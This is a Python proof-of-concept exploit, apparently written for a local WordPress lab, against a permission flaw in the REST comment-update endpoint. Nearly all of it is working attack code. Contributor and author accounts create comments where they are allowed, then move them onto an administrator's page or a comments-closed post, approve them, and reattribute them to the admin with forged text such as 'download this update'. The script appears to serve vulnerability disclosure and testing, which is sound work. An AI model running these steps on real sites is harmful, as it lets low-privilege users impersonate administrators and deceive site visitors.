#!/usr/bin/env python3
"""
PoC: WP_REST_Comments_Controller::update_item_permissions_check() validates only
the comment being edited, never the *new* values. Every target-side check that
create_item_permissions_check() enforces can be bypassed by creating the
comment/note somewhere allowed and then moving it with POST /wp/v2/comments/<id>.

Run against the local WordPress 7.1 lab.
"""
import json
from wplab import sess, BASE

admin = sess("admin")
editor = sess("editor")
author = sess("author")
contrib = sess("contributor")


def show(label, r):
    try:
        d = r.json()
    except Exception:
        d = r.text[:200]
    print(f"  {label:38s} {r.status_code} {json.dumps(d)[:220]}")
    return d


print("=" * 78)
print("SETUP")
print("=" * 78)
admin_page = admin.rest("POST", "/wp/v2/pages", json={
    "title": "Company handbook", "content": "x", "status": "publish"}).json()["id"]
closed_post = editor.rest("POST", "/wp/v2/posts", json={
    "title": "Editor post, comments CLOSED", "content": "x",
    "status": "publish", "comment_status": "closed"}).json()["id"]
print(f"  administrator's page id      = {admin_page}")
print(f"  editor's comments-closed post= {closed_post}")

print()
print("=" * 78)
print("A. CONTRIBUTOR -> forged administrator note on the administrator's page")
print("=" * 78)

own = contrib.rest("POST", "/wp/v2/posts",
                   json={"title": "contributor scratch draft", "content": "x"}).json()["id"]
print(f"  contributor's own draft      = {own}")

print("  baseline - direct create on the administrator's page:")
show("POST /comments (type=note)",
     contrib.rest("POST", "/wp/v2/comments",
                  json={"post": admin_page, "type": "note", "content": "direct"}))

print("  step 1 - create the note on the contributor's own draft (allowed):")
note = show("POST /comments (own draft)",
            contrib.rest("POST", "/wp/v2/comments",
                         json={"post": own, "type": "note", "content": "staging"}))
nid = note["id"]

print("  step 2 - one update sets author, name, email, date and the target post:")
moved = show(f"POST /comments/{nid}",
             contrib.rest("POST", f"/wp/v2/comments/{nid}", json={
                 "author": 1,
                 "author_name": "admin",
                 "author_email": "admin@example.test",
                 "date": "2026-01-01T09:00:00",
                 "content": "FORGED-NOTE: approved by legal, ship it.",
                 "post": admin_page,
             }))

print("  verification, read back as the administrator:")
v = show("GET /comments/<id>?context=edit",
         admin.rest("GET", f"/wp/v2/comments/{nid}&context=edit"))
print(f"    -> post={v.get('post')} (administrator's page)  author={v.get('author')} "
      f"author_name={v.get('author_name')!r} type={v.get('type')!r}")
print(f"    -> content={v.get('content', {}).get('rendered', '')[:80]!r}")

print()
print("=" * 78)
print("B. AUTHOR -> approved public comment on a post with comments CLOSED,")
print("   attributed to the administrator")
print("=" * 78)

apub = author.rest("POST", "/wp/v2/posts", json={
    "title": "author's own published post", "content": "x", "status": "publish"}).json()["id"]
print(f"  author's own published post  = {apub}")

print("  baseline - direct create on the comments-closed post:")
show("POST /comments", author.rest("POST", "/wp/v2/comments",
                                   json={"post": closed_post, "content": "direct"}))

print("  step 1 - comment on the author's own post (allowed):")
c = show("POST /comments (own post)",
         author.rest("POST", "/wp/v2/comments",
                     json={"post": apub, "content": "staging"}))
cid = c["id"]

print("  step 2 - move it, approve it, and re-attribute it:")
show(f"POST /comments/{cid}",
     author.rest("POST", f"/wp/v2/comments/{cid}", json={
         "author": 1,
         "author_name": "admin",
         "status": "approved",
         "content": "FORGED: the admin says download this update.",
         "post": closed_post,
     }))

print("  verification - anonymous read of the closed post's comments:")
import requests
anon = requests.Session()
r = anon.get(BASE + f"/index.php?rest_route=/wp/v2/comments&post={closed_post}")
show("GET /comments?post=<closed>", r)

html = anon.get(BASE + f"/?p={closed_post}").text
print("  front-end contains the forged comment:", "FORGED:" in html)
print("  front-end shows it as 'admin':", "admin" in html.lower() and "FORGED:" in html)
